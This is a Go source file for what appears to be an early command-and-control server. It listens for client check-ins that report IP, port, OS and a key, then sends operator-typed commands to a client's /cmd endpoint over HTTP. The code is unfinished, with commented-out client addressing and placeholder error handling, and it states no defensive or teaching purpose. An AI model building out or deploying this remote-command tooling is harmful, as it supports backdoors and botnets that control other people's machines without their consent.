package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
)

var ip = "localhost:5555"

type Contact struct {
	IP     string `json:"Ip"`
	Port   string `json:"Port"`
	System string `json:"System"` //os
	Key    string `json:"Key"`    //new programm -> new individual key for autorizaiton (make with time and load main function)
	//manager key also
	Date string `json:"Date"`
}

func setCommand() {

	for {
		if ip == "" {
			continue
		}

		fmt.Printf("Enter the command here: ")
		//var command string
		//fmt.Fscan(os.Stdin, &command) // fix the problem with space

		in := bufio.NewReader(os.Stdin)
		text, err := in.ReadString('\n')
		command := strings.Replace(text, " ", "+", -1)
		command = command[:len(command)-2]

		fmt.Printf(command)
		url := "http://" + ip + "/cmd?m=" + command
		fmt.Printf(url)

		fmt.Printf("\n")

		resp, err := http.Post(url, "application/json", nil) //edit exceptions
		if err != nil {
			panic(err)
		}
		defer resp.Body.Close()
	}
}

func main() {
	startServer()
}
func startServer() {
	fmt.Printf("Starting.. \n")
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, "Hello")
	})
	http.HandleFunc("/check", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, r.URL.Query().Get("m"))
	})
	http.HandleFunc("/ready", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		var Contact Contact
		err := json.NewDecoder(r.Body).Decode(&Contact)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		fmt.Printf("Client ready for commands:	\n")
		fmt.Printf("\t %s \n", Contact.IP)
		fmt.Printf("\t %s \n", Contact.Port)
		fmt.Printf("\t %s \n", Contact.System)
		fmt.Printf("\t %s \n", Contact.Date)

		fmt.Printf("\n")
		go setCommand()
		//ip = rdy.IP
	})

	http.ListenAndServe(":1234", nil)
}
